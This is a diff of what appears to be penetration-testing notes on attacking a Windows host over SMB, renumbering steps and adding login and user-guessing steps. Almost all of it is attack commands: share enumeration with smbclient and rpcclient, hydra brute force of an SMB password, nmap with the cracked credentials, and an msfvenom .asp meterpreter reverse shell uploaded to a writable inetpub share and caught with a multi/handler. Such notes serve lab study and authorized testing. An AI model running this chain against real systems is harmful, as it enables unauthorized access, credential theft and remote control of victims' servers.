@@ -38,8 +38,8 @@ We can use this to enumerate the server, users and domain users on the system.
 List all shares:
 `smbclient -L \\192.168.1.1 --option='client min protocol=NT1'`
 
-Gain access to share
-`smbclient \\\\192.168.1.1\\C$ --option='client min protocol=NT1'`
+Connect to SMB  share
+`smbclient \\\\192.168.1.1\\SHARENAME`
  
  ## Password Cracking
  If we can enumerate a user we may be able to crack a password.
@@ -54,35 +54,44 @@ Gain access to share
  1. Use Nmap to scan and enumerate smb
  `nmap 192.168.1.1 --script=smb-enum* -p 445 -vvv`
 
- 2. Use rpcclient to attempt a log in. Use the question ? to view a list of actions
+ 2. Attempt to log in
+ Using rpcclient:
  ```sh
  rpcclient -U "" 192.168.1.1
  rpcclient $> ?
  ```
+
+ Using smbclient
+ ```sh
+ smbclient \\\\192.168.1.1\\SHARENAME
+ ```
+
+ 3. Discover Users
+ It is possible to guess using common numbers
 
 ```sh
 rpcclient $> queryuser 500 (admin)
 rpcclient $> queryuser 1000 (admin)
 ```
 
-3. Once you have found a user, we will use hydra to brute force the password.
+4. Once you have found a user, we will use hydra to brute force the password.
 `hydra -l IEUSER -P passwords.lst 192.168.1.1 smb`
 
-4. Now that we have a username and password we can run nmap again using those credentials.
+5. Now that we have a username and password we can run nmap again using those credentials.
 `nmap --script smb-enum* --script-args smbusername=IEUSER, smbpass=Passw0rd! -p445 192.168.1.1`
 
-5. This will give us signigicantly more information:
+6. This will give us signigicantly more information:
 - logged in sessions
 - other users
 - directories
 
-6. We'll notice this user has read / write access to the webserver "inetpub". We'll want to access this directly.
+7. We'll notice this user has read / write access to the webserver "inetpub". We'll want to access this directly.
 ```smb
 smbclient \\\\192.168.1.1\\inetpub -U IEUSER
 smb: \> cd
 ```
 
-7. Create .asp reverse shell using MSFVenom
+8. Create .asp reverse shell using MSFVenom
 ```sh
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f asp > shell.asp
 msfconsole -x "use /exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.1; set lport 4444; run -j"
@@ -90,12 +99,12 @@ msfconsole -x "use /exploit/multi/handler; set payload windows/meterpreter/rever
 `-j` - Background process
 
 
-8. Moving back to our smb session:
+9. Moving back to our smb session:
 ```sh
 smb:  put shell.asp shell.asp
 ```
 
-9. On the exploited webserver go to the uploaded shell.asp file
+10. On the exploited webserver go to the uploaded shell.asp file
 A meterpreter sessions will be opened. 
 ```sh
 msf6 exploit(multi/handler) > session 1
